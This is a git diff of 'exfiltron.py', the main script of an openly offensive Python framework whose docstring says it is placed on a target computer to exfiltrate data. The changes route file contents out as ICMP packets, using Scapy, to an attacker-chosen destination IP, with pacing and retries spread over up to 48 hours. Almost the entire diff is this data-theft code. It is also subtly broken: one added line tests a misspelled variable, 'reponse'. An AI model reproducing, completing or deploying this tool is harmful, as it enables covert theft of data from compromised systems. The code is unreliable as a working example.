@@ -3,7 +3,8 @@ File: exfiltron.py
 Author: Thomas DAniels
 Purpose: This is the main running program for the Exfiltron framework. This
         program is used as a prompt for the attacker to execute his or her
-        desired commands using other parts of this framework.
+        desired commands using other parts of this framework and should be
+        placed on the target computer to exfiltrate data from.
 """
 
 
@@ -82,7 +83,7 @@ def setArgParserOptions():
     return parser.parse_args()
 
 
-def send(packets, amountOfTime):
+def send(packets, amountOfTime, destIP):
     """
     Purpose: This function sends out all the packets created by the
             user-specified module
@@ -93,11 +94,11 @@ def send(packets, amountOfTime):
 
     for packet in packets:
         for numRetries in range(0, FOURTY_EIGHT_HOURS/SIX_HOURS):
-            response = sr1(packet, inter=time, retry=RETRY,
-                           timeout=(TIMEOUT*amountOfTime))
+            response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
+                           filter="host " + destIP + " and icmp")
 
         # If we don't see a response, try again in 6 hours
-        if(response[0].show() is None):
+        if(reponse is None or response[0].show() is None):
             time.sleep(SIX_HOURS)
         else:
             break  # Continue on to the next packet
@@ -108,13 +109,15 @@ def send(packets, amountOfTime):
             print("Exiting..")
             sys.exit()
 
+        # Wait for the specified amount of time before sending another packet
+        time.sleep(amountOfTime)
 
 def main():
     # Parse the commands from the command line with argparser
     args = setArgParserOptions()
 
     # Determine the method of exfiltration
-    if(arg.method == 'icmp'):
+    if(args.method == 'icmp'):
         # Attempt to import Exfiltron's ICMP package
         try:
             import icmp
@@ -122,7 +125,8 @@ def main():
             print("Unable to import the icmp package.\nExiting...")
             sys.exit()
 
-        send(icmp(args.DEST-IP, args.FILE-NAME, args.DATA-PER-PACKET))
+        send(icmp.icmp(args.dest_ip, args.file_name, args.data_per_packet),
+             args.time, args.dest_ip)
 
 
 if (__name__ == '__main__'):
